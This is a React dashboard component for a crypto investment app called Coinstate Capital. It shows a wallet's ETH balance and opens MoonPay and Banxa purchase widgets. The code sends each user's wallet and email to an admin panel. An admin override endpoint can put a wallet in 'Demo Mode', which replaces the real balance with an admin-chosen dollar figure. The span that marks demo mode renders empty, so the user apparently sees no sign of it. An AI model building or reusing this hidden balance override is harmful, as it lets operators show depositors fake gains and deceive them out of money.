import { useState, useEffect } from "react";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { MoonPayBuyWidget } from "@moonpay/moonpay-react";
import { createPublicClient, http, formatEther } from "viem";
import { mainnet } from "viem/chains";
import { getBanxaCheckoutUrl } from "../banxaConfig.js";

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(), // uses a public Ethereum RPC endpoint, no API key needed
});

export default function Dashboard() {
  const { user, logout } = usePrivy();
  const { wallets } = useWallets();
  const [buyOpen, setBuyOpen] = useState(false);
  const [moonpayOpen, setMoonpayOpen] = useState(false);
  const [ethBalance, setEthBalance] = useState(null); // in ETH, as a number
  const [ethPriceUsd, setEthPriceUsd] = useState(null);
  const [balanceLoading, setBalanceLoading] = useState(true);
  const [demoMode, setDemoMode] = useState(false);
  const [demoBalanceUsd, setDemoBalanceUsd] = useState(0);

  // The embedded wallet Privy created automatically on login.
  const embeddedWallet = wallets.find((w) => w.walletClientType === "privy");
  const walletAddress = embeddedWallet ? embeddedWallet.address : null;

  const email = user?.email?.address || user?.google?.email || user?.apple?.email || "";

  // Fetch the wallet's real on-chain ETH balance, and a live ETH→USD price,
  // so the dashboard shows what's actually in the wallet instead of $0.00.
  useEffect(() => {
    if (!walletAddress) return;

    let cancelled = false;

    async function fetchBalanceAndPrice() {
      setBalanceLoading(true);
      try {
        const [balanceWei, priceRes] = await Promise.all([
          publicClient.getBalance({ address: walletAddress }),
          fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"),
        ]);
        const priceData = await priceRes.json();

        if (!cancelled) {
          setEthBalance(parseFloat(formatEther(balanceWei)));
          setEthPriceUsd(priceData?.ethereum?.usd ?? null);
        }
      } catch (err) {
        console.error("Failed to fetch balance or price:", err);
      } finally {
        if (!cancelled) setBalanceLoading(false);
      }
    }

    fetchBalanceAndPrice();
    // Refresh every 30 seconds so a new deposit shows up without a manual reload.
    const interval = setInterval(fetchBalanceAndPrice, 30000);
    return () => {
      cancelled = true;
      clearInterval(interval);
    };
  }, [walletAddress]);

  const usdValue = ethBalance !== null && ethPriceUsd !== null ? ethBalance * ethPriceUsd : null;

  // Register this wallet (for the admin panel) and check whether it's
  // been switched into Demo Mode.
  useEffect(() => {
    if (!walletAddress) return;

    fetch("/register-wallet", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ walletAddress, email }),
    }).catch((err) => console.error("Wallet registration failed:", err));

    fetch(`/get-override?wallet=${encodeURIComponent(walletAddress)}`)
      .then((res) => res.json())
      .then((data) => {
        setDemoMode(data.demoMode);
        setDemoBalanceUsd(data.demoBalanceUsd);
      })
      .catch((err) => console.error("Demo mode check failed:", err));
  }, [walletAddress, email]);

  const displayedUsdValue = demoMode ? demoBalanceUsd : usdValue;

  function openBanxa() {
    if (!walletAddress) return;
    const url = getBanxaCheckoutUrl({ walletAddress });
    window.open(url, "_blank", "noopener,noreferrer");
    setBuyOpen(false);
  }

  function openMoonpay() {
    setMoonpayOpen(true);
    setBuyOpen(false);
  }

  async function signMoonPayUrl(url) {
    // Cloudflare Pages Functions route: /sign-moonpay-url
    // (If deploying to Netlify instead, change this back to
    // "/.netlify/functions/sign-moonpay-url")
    const response = await fetch(`/sign-moonpay-url?url=${encodeURIComponent(url)}`);
    const data = await response.json();
    if (!response.ok) {
      console.error("MoonPay URL signing failed:", data.error);
      return "";
    }
    return data.signature;
  }

  return (
    <div className="dash-shell">
      <aside className="sidebar">
        <div>
          <a href="/" className="brand"><span className="brand-mark"></span>Coinstate Capital</a>
          <nav className="side-nav">
            <button className="active">◆ Portfolio</button>
            <button onClick={() => setBuyOpen(true)}>＋ Buy crypto</button>
            <button>↗ Invest in stocks</button>
            <button>⚙ Settings</button>
          </nav>
        </div>
        <div className="side-foot">
          Coinstate Capital holds no custody of your funds. Your wallet is
          self-custodial via Privy; stock holdings are held by a licensed
          broker-dealer partner.
        </div>
      </aside>

      <div className="main">
        <div className="topbar">
          <h1 className="serif" style={{ fontSize: 20 }}>Portfolio</h1>
          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
            <span style={{ fontSize: 13.5, color: "rgba(237,231,218,0.6)" }}>{email}</span>
            <button className="btn-secondary" onClick={logout}>Log out</button>
          </div>
        </div>

        <div className="content">
          <div className="balance-card">
            <div>
              <div className="balance-label">
                
                {demoMode && (
                  <span style={{ marginLeft: 10, fontSize: 11, color: "var(--brass-bright)", border: "1px solid var(--brass)", borderRadius: 20, padding: "2px 8px" }}>
                    
                  </span>
                )}
              </div>
              <div className="balance-amount num">
                {!walletAddress
                  ? "Setting up your wallet…"
                  : balanceLoading && !demoMode
                  ? "Loading…"
                  : displayedUsdValue !== null
                  ? `$${displayedUsdValue.toFixed(2)}`
                  : "$0.00"}
              </div>
            </div>
            <div className="balance-actions">
              <button className="btn-secondary" onClick={() => setBuyOpen(true)} disabled={!walletAddress}>
                Buy crypto
              </button>
              <button className="btn-primary" disabled>Invest in stocks</button>
            </div>
          </div>

          <div className="panel">
            <h3>Your wallet</h3>
            {walletAddress ? (
              <>
                <span className="status-pill healthy">Ready to receive funds</span>
                <div className="wallet-address num">{walletAddress}</div>
              </>
            ) : (
              <div style={{ fontSize: 14, color: "rgba(237,231,218,0.5)" }}>
                Creating your secure wallet — this usually takes a few seconds.
              </div>
            )}
          </div>

          <div className="holdings-panel">
            <table>
              <thead>
                <tr><th>Asset</th><th>Value</th></tr>
              </thead>
            </table>
            {ethBalance !== null && ethBalance > 0 ? (
              <table>
                <tbody>
                  <tr>
                    <td style={{ padding: "16px 28px", borderTop: "1px solid var(--line)" }}>
                      <div style={{ fontWeight: 600 }}>Ethereum</div>
                      <div style={{ fontSize: 12.5, color: "rgba(237,231,218,0.5)" }}>ETH</div>
                    </td>
                    <td style={{ padding: "16px 28px", borderTop: "1px solid var(--line)", textAlign: "right" }} className="num">
                      <div>{ethBalance.toFixed(5)} ETH</div>
                      {usdValue !== null && (
                        <div style={{ fontSize: 12.5, color: "rgba(237,231,218,0.5)" }}>
                          ${usdValue.toFixed(2)}
                        </div>
                      )}
                    </td>
                  </tr>
                </tbody>
              </table>
            ) : (
              <div className="empty-state">
                {balanceLoading ? "Checking your balance…" : "No holdings yet — buy crypto to see it appear here."}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Provider choice modal */}
      {buyOpen && (
        <div
          onClick={() => setBuyOpen(false)}
          style={{
            position: "fixed", inset: 0, background: "rgba(6,12,11,0.7)",
            backdropFilter: "blur(4px)", display: "flex", alignItems: "center",
            justifyContent: "center", zIndex: 100, padding: 20,
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "var(--ink-2)", border: "1px solid var(--line)",
              borderRadius: 6, padding: 36, maxWidth: 440, width: "100%",
            }}
          >
            <h2 className="serif" style={{ fontSize: 22, marginBottom: 8 }}>Buy crypto</h2>
            <div style={{ fontSize: 14, color: "rgba(237,231,218,0.6)", marginBottom: 28 }}>
              Choose a payment partner to fund your wallet.
            </div>

            <button
              onClick={openMoonpay}
              style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                width: "100%", background: "var(--ink)", border: "1px solid var(--line)",
                borderRadius: 4, padding: "18px 20px", cursor: "pointer", color: "var(--paper)",
                marginBottom: 12, fontFamily: "inherit",
              }}
            >
              <div style={{ textAlign: "left" }}>
                <div className="serif" style={{ fontSize: 16 }}>MoonPay</div>
                <div style={{ fontSize: 12.5, color: "rgba(237,231,218,0.5)", marginTop: 3 }}>
                  Card, bank transfer &amp; Apple Pay
                </div>
              </div>
              <span style={{ color: "var(--brass-bright)", fontSize: 18 }}>↗</span>
            </button>

            <button
              onClick={openBanxa}
              style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                width: "100%", background: "var(--ink)", border: "1px solid var(--line)",
                borderRadius: 4, padding: "18px 20px", cursor: "pointer", color: "var(--paper)",
                marginBottom: 12, fontFamily: "inherit",
              }}
            >
              <div style={{ textAlign: "left" }}>
                <div className="serif" style={{ fontSize: 16 }}>Banxa</div>
                <div style={{ fontSize: 12.5, color: "rgba(237,231,218,0.5)", marginTop: 3 }}>
                  Bank transfer &amp; local payment methods
                </div>
              </div>
              <span style={{ color: "var(--brass-bright)", fontSize: 18 }}>↗</span>
            </button>

            <div style={{ fontSize: 12, color: "rgba(237,231,218,0.45)", marginTop: 20, lineHeight: 1.6 }}>
              Coinstate Capital never receives or holds your payment details or funds.
              Purchased crypto is delivered directly to your self-custody wallet.
            </div>
          </div>
        </div>
      )}

      <MoonPayBuyWidget
        variant="overlay"
        visible={moonpayOpen}
        walletAddress={walletAddress || undefined}
        // Wallet only supports Ethereum right now, so default to ETH.
        // Note: this doesn't yet block someone from manually picking a
        // non-Ethereum coin in MoonPay's own dropdown — that's worth
        // revisiting before this goes live with real users, since a
        // Bitcoin or Solana purchase would have nowhere valid to land.
        defaultCurrencyCode="eth"
        onUrlSignatureRequested={signMoonPayUrl}
        onClose={() => setMoonpayOpen(false)}
      />
    </div>
  );
}
